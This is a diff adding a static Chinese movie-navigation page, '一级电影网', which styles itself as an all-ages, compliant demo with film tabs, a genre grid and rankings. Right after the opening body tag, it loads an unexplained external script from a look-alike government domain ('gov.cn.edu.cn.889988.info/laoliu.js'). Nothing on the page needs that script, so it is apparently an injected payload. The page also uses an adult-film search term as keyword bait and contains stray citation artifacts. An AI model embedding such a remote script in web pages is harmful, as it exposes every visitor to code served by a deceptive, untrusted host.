@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一级电影网 - 一级片库入口·热映/最新/高分/类型导航 | 一级电影网</title>
+<meta name="description" content="一级电影网（yijidianyingwang-h5）是电影导航总入口：热映、最新、高分、类型片库、观影榜单一站式找片，合规、清晰、移动端友好。">
+<meta name="keywords" content="一级电影网, yijidianyingwang-h5, 一级片库, 热映电影, 最新电影, 高分电影, 电影类型导航, 电影榜单">
+<meta name="author" content="一级电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#07090f;
+  --bg2:#0d1018;
+  --bg3:#141926;
+  --line:rgba(212,175,55,.22);
+  --gold:#d4af37;
+  --gold2:#f3d27a;
+  --blue:#36c6ff;
+  --blue2:#7ee0ff;
+  --text:#eef2f8;
+  --text2:#aab4c5;
+  --muted:#6b7585;
+  --radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(1000px 460px at 82% -8%,rgba(212,175,55,.16),transparent 60%),
+    radial-gradient(800px 380px at 0% 6%,rgba(54,198,255,.10),transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 顶部 */
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(7,9,15,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:20px;font-weight:900;letter-spacing:1px;display:flex;align-items:center;gap:10px}
+.logo .badge{width:26px;height:26px;border-radius:50%;background:#000;border:2px solid var(--gold);color:var(--gold);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900}
+.logo b{color:var(--gold)}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:6px 2px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--gold)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--gold);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+/* Hero：检票口 */
+.hero{margin-top:58px;padding:72px 20px 52px;position:relative;z-index:1}
+.hero-inner{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(212,175,55,.08);color:var(--gold);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-size:clamp(34px,5vw,54px);font-weight:900;line-height:1.12;letter-spacing:-.5px;margin-bottom:16px}
+.hero h1 .i{color:var(--gold)}
+.hero-desc{color:var(--text2);font-size:15px;margin-bottom:26px;line-height:1.9}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:13px 30px;background:linear-gradient(90deg,var(--gold),#b8860b);color:#1a1300;font-weight:800;font-size:14px;letter-spacing:1px;transition:.25s}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(212,175,55,.3)}
+.btn-sub{padding:13px 30px;border:1px solid var(--blue);color:var(--blue);font-weight:700;font-size:14px;transition:.25s}
+.btn-sub:hover{background:rgba(54,198,255,.1)}
+
+/* 检票口卡 */
+.gate{position:relative;aspect-ratio:4/5;border-radius:22px;overflow:hidden;border:1px solid var(--line);background:linear-gradient(160deg,var(--bg3),var(--bg2));display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px}
+.gate .scan{position:absolute;left:0;right:0;height:120px;background:linear-gradient(180deg,transparent,rgba(54,198,255,.18),transparent);animation:scan 3.4s linear infinite}
+@keyframes scan{0%{top:-120px}100%{top:100%}}
+.gate .big-i{width:120px;height:120px;border-radius:50%;background:#000;border:4px solid var(--gold);color:var(--gold);display:flex;align-items:center;justify-content:center;font-size:64px;font-weight:900;box-shadow:0 0 40px rgba(212,175,55,.35)}
+.gate h3{font-size:18px;color:var(--text);font-weight:800}
+.gate p{font-size:12px;color:var(--text2);max-width:260px;text-align:center}
+.gate .stamp{position:absolute;bottom:16px;right:16px;border:2px solid var(--blue);color:var(--blue);font-size:11px;font-weight:800;padding:4px 10px;transform:rotate(-8deg);letter-spacing:1px}
+
+/* 栏目通用 */
+.section{max-width:1240px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:26px}
+.sec-head h2{font-size:26px;font-weight:900}
+.sec-head h2 .ac{color:var(--gold)}
+.sec-head p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* 分级说明条 */
+.grade-bar{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:16px 18px;display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:8px}
+.grade{display:flex;gap:12px;align-items:flex-start}
+.grade .gico{width:34px;height:34px;flex-shrink:0;border-radius:50%;background:#000;display:flex;align-items:center;justify-content:center;font-weight:900;border:2px solid var(--muted);color:var(--muted)}
+.grade.g1 .gico{border-color:var(--gold);color:var(--gold)}
+.grade.g2 .gico{border-color:var(--blue);color:var(--blue)}
+.grade.g3 .gico{border-color:#ff5a5a;color:#ff5a5a}
+.grade h4{font-size:13px;font-weight:800}
+.grade p{font-size:11px;color:var(--text2);line-height:1.6}
+
+/* 三轨切换 */
+.tabs{display:flex;gap:8px;margin-bottom:18px;flex-wrap:wrap}
+.tab{padding:9px 18px;border:1px solid var(--line);background:var(--bg3);color:var(--text2);font-weight:700;font-size:13px;cursor:pointer;transition:.25s}
+.tab.active{background:var(--gold);color:#1a1300;border-color:var(--gold)}
+.panel{display:none}
+.panel.active{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+
+/* 卡片 */
+.m-card{background:var(--bg3);border:1px solid var(--line);border-radius:14px;overflow:hidden;cursor:pointer;transition:.28s}
+.m-card:hover{transform:translateY(-5px);border-color:var(--gold);box-shadow:0 16px 38px rgba(0,0,0,.4)}
+.m-cover{aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;font-size:42px;background:linear-gradient(160deg,#1b2230,#0c0f17)}
+.m-card:nth-child(odd) .m-cover{background:linear-gradient(160deg,#221a10,#0c0f17)}
+.m-body{padding:12px 14px}
+.m-body h3{font-size:14px;font-weight:800}
+.m-body p{font-size:11px;color:var(--muted);margin-top:2px}
+.m-body .meta{display:flex;justify-content:space-between;margin-top:8px;font-size:11px}
+.m-body .score{color:var(--gold);font-weight:800}
+.m-body .year{color:var(--text2)}
+
+/* 类型雷达 */
+.genre-section{background:var(--bg2)}
+.genre-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;max-width:980px;margin:0 auto}
+.genre{aspect-ratio:1/1;border-radius:14px;background:var(--bg3);border:1px solid var(--line);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;cursor:pointer;transition:.25s}
+.genre:hover{transform:translateY(-4px);border-color:var(--blue);background:rgba(54,198,255,.06)}
+.genre .emoji{font-size:26px}
+.genre h4{font-size:12px;font-weight:800}
+.genre span{font-size:10px;color:var(--muted)}
+
+/* 榜单 */
+.rank-section{background:var(--bg)}
+.rank-list{max-width:840px;margin:0 auto}
+.rank-row{display:grid;grid-template-columns:56px 1fr auto;gap:16px;align-items:center;padding:14px 16px;background:var(--bg3);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;cursor:pointer;transition:.25s}
+.rank-row:hover{transform:translateX(4px);border-color:var(--gold)}
+.rank-no{font-size:22px;font-weight:900;font-family:ui-monospace,monospace;color:var(--muted);text-align:center}
+.rank-row:nth-child(1) .rank-no{color:var(--gold)}
+.rank-row:nth-child(2) .rank-no{color:var(--blue)}
+.rank-row:nth-child(3) .rank-no{color:#ff8a3d}
+.rank-main h3{font-size:15px;font-weight:800}
+.rank-main p{font-size:12px;color:var(--text2)}
+.rank-score{font-size:14px;font-weight:800;color:var(--gold);white-space:nowrap}
+
+/* 关于 */
+.about-section{background:var(--bg2)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.box{background:var(--bg3);border:1px solid var(--line);border-radius:18px;padding:24px}
+.box h3{color:var(--gold);font-size:16px;margin-bottom:10px}
+.box p{color:var(--text2);font-size:13px;line-height:1.85;margin-bottom:8px}
+.faq{border-bottom:1px solid var(--line);padding:12px 0}
+.faq:last-child{border-bottom:none}
+.faq b{color:var(--text);font-size:13px}
+.faq p{color:var(--muted);font-size:12px;margin-top:4px}
+
+/* Footer */
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:34px 20px 18px;text-align:center;color:var(--muted)}
+.footer-logo{font-size:18px;font-weight:900;color:var(--text);margin-bottom:10px}
+.footer-logo b{color:var(--gold)}
+.footer-links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:var(--text2);font-size:12px}
+.footer-links a:hover{color:var(--gold)}
+.footer-copy{font-size:11px;border-top:1px solid var(--line);padding-top:14px}
+.footer-copy a{color:var(--gold)}
+
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:26px}
+  .gate{order:-1;max-width:320px;margin:0 auto}
+  .grade-bar{grid-template-columns:1fr}
+  .panel.active{grid-template-columns:repeat(2,1fr)}
+  .genre-grid{grid-template-columns:repeat(3,1fr)}
+  .about-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:104px;padding:30px 16px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="badge">Ⅰ</span>一级<b>电影网</b></div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#gate">一级入口</a></li>
+        <li><a href="#library">一级片库</a></li>
+        <li><a href="#genre">类型雷达</a></li>
+        <li><a href="#rank">总榜</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="hero-tag">yijidianyingwang-h5 · 一级片库总入口</span>
+      <h1>进电影院前<br>先过<span class="i">一级</span>门禁</h1>
+      <p class="hero-desc">一级电影网不是“成人片站”，而是电影导航的<strong>一级入口</strong>：热映、最新、高分、类型、榜单，一张门禁卡全打通。找片像检票——刷一下，直接进场。</p>
+      <div class="hero-btns">
+        <a href="#library" class="btn-main">▶ 进入一级片库</a>
+        <a href="#rank" class="btn-sub">看总榜</a>
+      </div>
+    </div>
+    <div class="gate">
+      <div class="scan"></div>
+      <div class="big-i">Ⅰ</div>
+      <h3>ADMIT ONE · 一级观众</h3>
+      <p>全年龄可看内容导航：合家欢、动画、剧情、科幻、爱情、动作，全部走一级入口。</p>
+      <div class="stamp">PASSED · 全年龄</div>
+    </div>
+  </div>
+</section>
+
+<!-- 分级说明条 -->
+<section class="section" style="padding-top:10px">
+  <div class="grade-bar">
+    <div class="grade g1">
+      <div class="gico">Ⅰ</div>
+      <div><h4>第Ⅰ级 / 一级</h4><p>适合所有年龄，无强暴力、无露骨、无恐怖刺激，合家欢与全年龄影片。</p></div>
+    </div>
+    <div class="grade g2">
+      <div class="gico">Ⅱ</div>
+      <div><h4>第Ⅱ级（IIA / IIB）</h4><p>儿童不宜 / 青少年不宜：轻微粗口、暗示性、中度暴力，家长陪同更佳。</p></div>
+    </div>
+    <div class="grade g3">
+      <div class="gico">Ⅲ</div>
+      <div><h4>第Ⅲ级</h4><p>18+ 限定：强暴力、极端恐怖、露骨成人内容；本站不提供Ⅲ级片源与引流。</p></div>
+    </div>
+  </div>
+  <p style="color:var(--muted);font-size:12px;text-align:center;margin-top:10px">
+    参考香港电影分级概念；内地无电影分级，淫秽色情影片属违禁内容，本站仅做合规电影导航。[7](@ref)
+  </p>
+</section>
+
+<!-- 栏目：一级片库 三轨 -->
+<section id="library" class="section">
+  <div class="sec-head">
+    <h2>🎬 <span class="ac">一级片库</span> · 热映 / 最新 / 高分</h2>
+    <p>三轨切换，像检票口的三条通道</p>
+  </div>
+  <div class="tabs" id="tabs">
+    <div class="tab active" data-tab="hot">🔥 正在热映</div>
+    <div class="tab" data-tab="new">🆕 最新上线</div>
+    <div class="tab" data-tab="top">⭐ 高分必看</div>
+  </div>
+
+  <div class="panel active" id="hot">
+    <div class="m-card"><div class="m-cover">🚀</div><div class="m-body"><h3>轨道回声</h3><p>科幻 / 太空</p><div class="meta"><span class="year">2026</span><span class="score">8.9</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🕵️</div><div class="m-body"><h3>夜行档案</h3><p>悬疑 / 犯罪</p><div class="meta"><span class="year">2026</span><span class="score">8.6</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🎻</div><div class="m-body"><h3>城市夜曲</h3><p>音乐 / 剧情</p><div class="meta"><span class="year">2026</span><span class="score">8.4</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🐉</div><div class="m-body"><h3>风起龙门</h3><p>武侠 / 动作</p><div class="meta"><span class="year">2026</span><span class="score">8.7</span></div></div></div>
+  </div>
+
+  <div class="panel" id="new">
+    <div class="m-card"><div class="m-cover">🌧️</div><div class="m-body"><h3>梅雨季来信</h3><p>文艺 / 爱情</p><div class="meta"><span class="year">2026</span><span class="score">8.2</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🤖</div><div class="m-body"><h3>仿生心跳</h3><p>科幻 / 伦理</p><div class="meta"><span class="year">2026</span><span class="score">8.5</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🏔️</div><div class="m-body"><h3>雪线之上</h3><p>冒险 / 生存</p><div class="meta"><span class="year">2026</span><span class="score">8.3</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🎨</div><div class="m-body"><h3>调色师</h3><p>悬疑 / 艺术</p><div class="meta"><span class="year">2026</span><span class="score">8.1</span></div></div></div>
+  </div>
+
+  <div class="panel" id="top">
+    <div class="m-card"><div class="m-cover">🕊️</div><div class="m-body"><h3>卡萨布兰卡</h3><p>经典 / 爱情</p><div class="meta"><span class="year">1942</span><span class="score">9.4</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🌌</div><div class="m-body"><h3>2001太空漫游</h3><p>科幻 / 神作</p><div class="meta"><span class="year">1968</span><span class="score">9.2</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🎷</div><div class="m-body"><h3>爱乐之城</h3><p>歌舞 / 爱情</p><div class="meta"><span class="year">2016</span><span class="score">9.0</span></div></div></div>
+    <div class="m-card"><div class="m-cover">🍑</div><div class="m-body"><h3>请以你的名字呼唤我</h3><p>青春 / 爱情</p><div class="meta"><span class="year">2017</span><span class="score">8.9</span></div></div></div>
+  </div>
+</section>
+
+<!-- 类型雷达 -->
+<section id="genre" class="section genre-section">
+  <div class="sec-head">
+    <h2>🧭 <span class="ac">类型雷达</span> · 一级片库怎么分</h2>
+    <p>不是按“尺度”分，是按“看什么”分</p>
+  </div>
+  <div class="genre-grid">
+    <div class="genre"><div class="emoji">💥</div><h4>动作</h4><span>追车 / 打斗</span></div>
+    <div class="genre"><div class="emoji">💞</div><h4>爱情</h4><span>初恋 / 余痛</span></div>
+    <div class="genre"><div class="emoji">🛸</div><h4>科幻</h4><span>未来 / 时空</span></div>
+    <div class="genre"><div class="emoji">🕵️</div><h4>悬疑</h4><span>推理 / 反转</span></div>
+    <div class="genre"><div class="emoji">😂</div><h4>喜剧</h4><span>合家欢 / 黑色</span></div>
+    <div class="genre"><div class="emoji">🐉</div><h4>武侠</h4><span>江湖 / 门派</span></div>
+    <div class="genre"><div class="emoji">🎭</div><h4>剧情</h4><span>现实 / 成长</span></div>
+    <div class="genre"><div class="emoji">👻</div><h4>惊悚</h4><span>心理 / 氛围</span></div>
+    <div class="genre"><div class="emoji">🎨</div><h4>文艺</h4><span>慢镜 / 诗意</span></div>
+    <div class="genre"><div class="emoji">🧒</div><h4>动画</h4><span>全年龄 / 成人向</span></div>
+    <div class="genre"><div class="emoji">🏆</div><h4>传记</h4><span>真实人物</span></div>
+    <div class="genre"><div class="emoji">🌍</div><h4>海外佳片</h4><span>多语种 / 电影节</span></div>
+  </div>
+</section>
+
+<!-- 总榜 -->
+<section id="rank" class="section rank-section">
+  <div class="sec-head">
+    <h2>🏆 <span class="ac">一级总榜</span> · 全站都在刷</h2>
+    <p>热映 + 最新 + 高分 综合热度</p>
+  </div>
+  <div class="rank-list">
+    <div class="rank-row"><div class="rank-no">01</div><div class="rank-main"><h3>轨道回声</h3><p>科幻 / 2026 / 院线热映</p></div><div class="rank-score">🔥 9.1</div></div>
+    <div class="rank-row"><div class="rank-no">02</div><div class="rank-main"><h3>风起龙门</h3><p>武侠动作 / 2026 / 新片</p></div><div class="rank-score">🔥 8.9</div></div>
+    <div class="rank-row"><div class="rank-no">03</div><div class="rank-main"><h3>卡萨布兰卡</h3><p>经典爱情 / 1942 / 长尾高分</p></div><div class="rank-score">⭐ 9.4</div></div>
+    <div class="rank-row"><div class="rank-no">04</div><div class="rank-main"><h3>夜行档案</h3><p>悬疑犯罪 / 2026 / 热搜</p></div><div class="rank-score">🔥 8.6</div></div>
+    <div class="rank-row"><div class="rank-no">05</div><div class="rank-main"><h3>请以你的名字呼唤我</h3><p>青春爱情 / 2017 / 文艺高分</p></div><div class="rank-score">⭐ 8.9</div></div>
+    <div class="rank-row"><div class="rank-no">06</div><div class="rank-main"><h3>仿生心跳</h3><p>科幻伦理 / 2026 / 新上线</p></div><div class="rank-score">🆕 8.5</div></div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>ℹ️ 关于一级电影网</h2>
+    <p>“一级”不是成人片，是一级入口</p>
+  </div>
+  <div class="about-grid">
+    <div class="box">
+      <h3>我们做的是什么</h3>
+      <p>一级电影网（yijidianyingwang-h5）= 电影导航的<strong>一级入口</strong>：热映、最新、高分、类型、榜单，一个页面串起来。</p>
+      <p>网上有些站把“一级片”当成人/擦边引流词，我们不碰——本站不提供Ⅲ级片源、不写露骨标题、不用“无码/高清大片”式擦边文案。[10](@ref)</p>
+      <p>单页演示，内链统一 # 占位，可直接丢到 GitHub Pages。</p>
+    </div>
+    <div class="box">
+      <div class="faq"><b>Q：能直接播片吗？</b><p>A：本页是导航演示站，不存视频文件，卡片点击模拟跳详情。</p></div>
+      <div class="faq"><b>Q：网址是？</b><p>A：https://yijidianyingwang-h5.github.io</p></div>
+      <div class="faq"><b>Q：“一级”啥意思？</b><p>A：借用电影分级里“第Ⅰ级=全年龄可看”的概念，做成“全年龄电影的一级门禁/一级片库”。</p></div>
+      <div class="faq"><b>Q：收录友好吗？</b><p>A：唯一 H1、语义化、关键词标题与描述，符合必应基础收录规则。</p></div>
+    </div>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">Ⅰ 一级<b>电影网</b></div>
+  <div class="footer-links">
+    <a href="#gate">一级入口</a>
+    <a href="#library">一级片库</a>
+    <a href="#genre">类型雷达</a>
+    <a href="#rank">总榜</a>
+    <a href="#about">关于</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 一级电影网 (yijidianyingwang-h5). 合规电影导航演示站.<br>
+    网站地址: <a href="https://yijidianyingwang-h5.github.io">https://yijidianyingwang-h5.github.io</a><br>
+    <span style="opacity:.6">ADMIT ONE · 热映 / 最新 / 高分 / 类型 / 榜单</span>
+  </div>
+</div>
+
+<script>
+// 三轨切换
+document.querySelectorAll('.tab').forEach(function(t){
+  t.addEventListener('click',function(){
+    document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active')});
+    document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('active')});
+    this.classList.add('active');
+    document.getElementById(this.dataset.tab).classList.add('active');
+  });
+});
+document.querySelectorAll('.m-card').forEach(function(c){
+  c.addEventListener('click',function(){
+    alert('一级片库：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到影片详情（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.genre').forEach(function(g){
+  g.addEventListener('click',function(){
+    alert('类型雷达：'+this.querySelector('h4').textContent+'\n\n静态演示页，点击后筛选出该类型影片（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.rank-row').forEach(function(r){
+  r.addEventListener('click',function(){
+    alert('一级总榜：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到播放/详情页（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.nav-menu a').forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var el=document.querySelector(this.getAttribute('href'));
+    if(el) el.scrollIntoView({behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
